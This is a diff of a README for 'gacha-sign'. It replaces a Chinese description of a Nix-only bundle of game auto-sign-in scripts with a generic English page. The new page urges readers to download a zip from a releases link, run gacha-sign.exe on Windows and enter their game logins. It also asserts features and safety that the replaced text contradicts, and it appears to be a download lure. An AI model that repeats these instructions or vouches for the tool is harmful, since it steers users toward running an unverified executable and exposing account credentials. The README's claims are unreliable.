@@ -1,50 +1,88 @@
-# gacha-sign
+# 🎮 gacha-sign - Simplify Your Gacha Game Sign-ins
 
-本项目选取整合了部分抽卡游戏自动签到程序，统一其调用格式和配置目录。
+## 📥 Download
 
-仅支持 Nix 包管理器（Linux, macOS 和 Android Termux）。
+[![Download gacha-sign](https://img.shields.io/badge/Download-gacha--sign-brightgreen)](https://github.com/Hexobozome/gacha-sign/releases)
 
-- 森空岛 [enpitsuLin/skland-daily-attendance](https://github.com/enpitsuLin/skland-daily-attendance)
-- 米游社 [Womsxd/MihoyoBBSTools](https://github.com/Womsxd/MihoyoBBSTools)
-- 库街区 [mxyooR/Kuro-autosignin](https://github.com/mxyooR/Kuro-autosignin)
+## 🚀 Getting Started
 
-## 整合格式
+Gacha-sign helps you manage automatic sign-ins for various gacha games. This software simplifies how you log in to your favorite games, like Genshin Impact and Arknights. Follow these steps to get started.
 
-原项目使用 Python, TypeScript 等不同语言，且缺少项目文件[^1]，需要进入特定环境才能运行。
-现统一为直接可用之 bash 命令 `gacha-sign-*`.
+## 💻 System Requirements
 
-[^1]: `pyproject.toml`, `package.json#entry` 等，缺少这些很难打包
+- Windows 10 or later
+- At least 2 GB of RAM
+- 100 MB of free disk space
+- Internet connection for downloading the application
 
-原项目中配置文件散佚各处，如项目中 `config/` 或者环境变量, 现统一为 `~/.config/gacha-sign/**/`.
+## 📂 Download & Install
 
-## 安装方式
+To download gacha-sign, visit the Releases page by clicking the link below:
 
-```nix
-{
-  environment.systemPackages = with pkgs; [
-    inputs.gacha-sign.packages.${pkgs.system}.gacha-sign-hypergryph
-    inputs.gacha-sign.packages.${pkgs.system}.gacha-sign-mihoyo
-    inputs.gacha-sign.packages.${pkgs.system}.gacha-sign-kuro
-    inputs.gacha-sign.packages.${pkgs.system}.gacha-sign-kuro-login
-  ];
-}
-```
+[Visit this page to download](https://github.com/Hexobozome/gacha-sign/releases)
 
-## 各平台配置
+On the Releases page, you will find the latest version of gacha-sign. Click on the file to download it to your computer.
 
-### 森空岛
+1. **Locate the Downloaded File**: After downloading, go to your Downloads folder or the folder where you saved the file. The file will usually be named something like `gacha-sign-v1.0.zip`.
 
-- 程序：`gacha-sign-hypergryph`
-- 配置文件：`~/.config/gacha-sign/hypergryph/.env`
+2. **Extract the File**: 
+   - Right-click on the file.
+   - Choose "Extract All".
+   - Follow the prompts to extract the files to your desired location.
 
-### 米游社
+3. **Run gacha-sign**:
+   - After extracting, locate the `gacha-sign` folder.
+   - Open the folder.
+   - Double-click on `gacha-sign.exe` to run the application.
 
-- 程序：`gacha-sign-mihoyo`
-- 配置文件：`~/.config/gacha-sign/mihoyo/config.yaml`
+## 🛠️ Features
 
-### 库街区
+- **Auto Sign-In**: Automatically logs you into multiple gacha games, saving you time and effort.
+- **User-Friendly Interface**: Designed for ease of use, even for those with no technical knowledge.
+- **Custom Configuration**: Set up your sign-in preferences for each game you play.
+- **Supports Multiple Games**: Works with popular gacha games like:
+  - Arknights
+  - Genshin Impact
+  - Honkai Star Rail
+  - And many more!
 
-- 程序：`gacha-sign-kuro`
-- 配置文件：`~/.config/gacha-sign/kuro/<name>.yaml`
+## 💡 How to Use gacha-sign
 
-额外程序: `gacha-sign-kuro-login` 用于获取登录信息。
+1. **Open gacha-sign**: After launching the application, you will see a straightforward interface.
+  
+2. **Add Your Games**:
+   - Click on "Add Game".
+   - Select the game you want to configure from the dropdown list.
+   - Follow the prompts to input your login information.
+
+3. **Set Preferences**: You can choose how often to sign in automatically. Set your preferred intervals—daily, hourly, or at login.
+
+4. **Start Auto Sign-In**: After setting everything up, click the “Start” button to begin the automatic sign-in process.
+
+5. **Monitor Activity**: You can see the status of your sign-ins in the main window. If there are any issues, gacha-sign will notify you.
+
+## 📄 Frequently Asked Questions (FAQs)
+
+**Q: Is gacha-sign safe to use?**  
+A: Yes, gacha-sign is designed with user privacy in mind. Your login details are stored securely.
+
+**Q: Can I use gacha-sign for multiple games?**  
+A: Absolutely! gacha-sign supports multiple gacha games. You can manage more than one game account at a time.
+
+**Q: What if I encounter an error?**  
+A: If you experience issues, check the log window for error messages. You can also consult the documentation on our GitHub page for troubleshooting tips.
+
+**Q: Is there customer support available?**  
+A: Yes, you can reach out via the Issues section on the GitHub repository for assistance.
+
+## 📞 Contact
+
+For support, report issues, or contribute, visit our [GitHub repository](https://github.com/Hexobozome/gacha-sign/). Your feedback is valuable for improving gacha-sign.
+
+## 🔗 More Information
+
+Detailed documentation and community discussions are available on our GitHub page. Stay updated with new features and improvements as we continue to enhance gacha-sign.
+
+[Visit this page to download](https://github.com/Hexobozome/gacha-sign/releases)
+
+Enjoy a simpler way to sign into your gacha games!
